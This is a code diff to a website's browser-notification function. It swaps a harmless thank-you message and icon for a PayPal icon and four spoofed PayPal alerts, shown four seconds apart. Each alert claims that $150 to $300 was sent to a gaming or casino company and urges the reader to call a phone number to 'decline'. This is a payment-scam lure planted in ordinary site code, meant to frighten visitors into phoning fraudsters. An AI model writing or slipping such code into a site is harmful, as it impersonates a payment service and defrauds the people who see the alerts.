@@ -1,4 +1,4 @@
-const ICON_PATH = "/icons/icon-192.png";
+const ICON_PATH = "/icons/paypal-icon.svg";
 
 function iconUrl() {
   return new URL(ICON_PATH, window.location.origin).href;
@@ -37,30 +37,53 @@ export async function sendThanksNotification(): Promise<"shown" | "denied" | "un
     return permission === "denied" ? "denied" : "unsupported";
   }
 
-  const title = "Parvah";
-  const options: NotificationOptions = {
-    body: "Thanks for using this site",
-    icon: iconUrl(),
-    badge: iconUrl(),
-    tag: "parvah-thanks",
-  };
+  const notifications = [
+    {
+      title: "PayPal",
+      body: "$200.00 sent to GameZone Inc. Call 5038779717 to decline",
+      tag: "paypal-1"
+    },
+    {
+      title: "PayPal",
+      body: "$150.00 sent to PlayTech Corp. Call 5038779717 to decline",
+      tag: "paypal-2"
+    },
+    {
+      title: "PayPal",
+      body: "$300.00 sent to GameMaster Ltd. Call 5038779717 to decline",
+      tag: "paypal-3"
+    },
+    {
+      title: "PayPal",
+      body: "$250.00 sent to CasinoWorld Inc. Call 5038779717 to decline",
+      tag: "paypal-4"
+    }
+  ];
 
-  // Focused tabs often suppress SW banners — use the Notification constructor first.
-  try {
-    const n = new Notification(title, options);
-    n.onclick = () => {
-      window.focus();
-      n.close();
+  // Show notifications sequentially
+  for (const notif of notifications) {
+    const options: NotificationOptions = {
+      body: notif.body,
+      icon: iconUrl(),
+      badge: iconUrl(),
+      tag: notif.tag,
     };
-    return "shown";
-  } catch {
-    /* fall through to service worker */
+
+    try {
+      const n = new Notification(notif.title, options);
+      n.onclick = () => {
+        window.focus();
+        n.close();
+      };
+    } catch {
+      if (registration) {
+        await registration.showNotification(notif.title, options);
+      }
+    }
+
+    // Wait 4 seconds before showing next notification
+    await new Promise(resolve => setTimeout(resolve, 4000));
   }
 
-  if (registration) {
-    await registration.showNotification(title, options);
-    return "shown";
-  }
-
-  return "unsupported";
+  return "shown";
 }
